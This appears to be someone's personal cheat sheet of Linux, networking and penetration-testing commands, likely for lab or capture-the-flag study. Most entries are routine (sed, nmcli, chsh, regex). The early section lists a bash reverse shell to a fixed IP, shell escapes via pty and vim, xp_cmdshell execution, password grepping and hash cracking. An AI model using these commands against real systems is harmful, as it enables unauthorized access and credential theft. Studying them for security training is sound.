systemd = most common init program in modern linux

&& = executes command if the previous command is successful

| = command1 output is used as input for command 2

; = command 2 executes after command 1 is finished

nmap  -sV :version -O :OS type -sC: Performs a script scan using the default set of scripts

regex to remember

`^` - matches beginning of the line, patches the position not the character

`$` - matches ending of the line, position not the character

smbclient -N (no passwd) -L ( look up) \\\\[ip]\\

python3 -m http.server [PORT]

xp_cmdshell "powershell -c [Command]"

type - cat equiv in powershell

winPEAS - windows vulnerability lookup

python3 -c 'import pty;pty.spawn("/bin/bash")' - Issue a functional shell through a reverse shell

find 

locate [filename]

sudo -l - see what commands you are allowed to run as sudoer

chmod +rwx [file]

export PATH]/[path]:$PATH - sets a command

/bin/sh - starts shell

zip2john - converts a zip file to file that john that crack

hashcat - dehash something

bash -c "bash -i >& /dev/tcp/10.10.15.16/443 0>&1" - issue stable shell through listener

cat * | grep -i pass* - look for password files

if given access to vim /bin/vi -> :set shell=/bin/sh  then run shell

awk '{print $5}' log.txt | cut -d';' -f2 | sort | uniq -c - sort unique of a certain column

grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" - sort IPs

notepad++ `^(?=.*\b[VALUE]\b)(?=.*\b[VALUE]\B)(?=.*\bVALUE\b).+$` find any string in one line

snort rules
`[ACTION] [PROTOCOL] [SRC IP/IP NET] [SRC PORT] -> [DEST IP] [DEST PORT] (rule option)

`du` -disk usage 

`tee` - read from stdin and write to stdout/files

	-a -append
 
	-i -ignore interrupts
 
### SSH

ssh-copy-id - allow login from one host to another

### SED

SED performs text transformations on steams

	substitiue some text for other text
 
	remove lines
 
	append text after given lines
 
	insert text before certain lines
 
	`sed  ` `[options]/search-pattern/replacement-string/flags`
 
		flags
  
		`i` -non -case sensitive
  
		`g` -global replaces all instances instead of first
  
		`d` - remove all that match
  
	sed `[OPTIONS]`
 
		`-i[replacementfile]
  
		`-s` - first character after the s is the delimiter char
  
		`-e` - tells sed to execute each differetn commant
  
			ex. `sed -e '/char/d' -e '/char2/d'`
   
		select the address/line
  
		`sed '2 s/apache/httpd/' config`

		``

Changing the shell of the cli 

  When altering a login shell the `chsh`  commmand displays the current login shell and prompts for a new one,
  
    /bin/sh
    
    /usr/bin/tcsh
    
    /usr/bin/bash
    
    /usr/bin/ksh
    
    /usr/bin/sh
    
    /usr/bin/csh
    
`chsh` cahnges the login shell of the username

Syntax: ` chsh [options] [login] `

  -l = used to specify login shell
  
  -u = prints list of shell
  
  -s = used to set the shell as your login shell

# Networking

Linux nmcli 

  command line tool for controlling network manager
  
  `nmcli [options] OBJECT {COMMAND | HELP }
  
    OBJECT options
    
      general | networking | radio | connection | device | agent | monitor
      
  -t , terse - computer script processing as you can see the teset output
  
  -f , field - specifies what fields can bebe displayed on output
  
  -p , pretty - human readable output
  
checking overall status of network manager

  nmcli general
  
Show UUID and others

  nmcli connection show
  
Can also be used to start and stop any network interface

  nmcli con up id bond0
  
  nmcli dev disconnect bond 0

"Note" : nmcli connection down deactivates the connection without preventing auto reconnect

  Nmcli device disconnect disconnects device and prevents reactivation
  
Restarting network services

      `sudo nmcli networking off
      
        `sudo nmcli networking on `
	
Text based ui - nmtui

DHCP - dhclient [-r|release]

`userdel` - delete users

`!!` - execute most recent command

	`!*` - execute most recent command matching `[*]`
 
Disable useraccount

	`Chage -E 0`


    
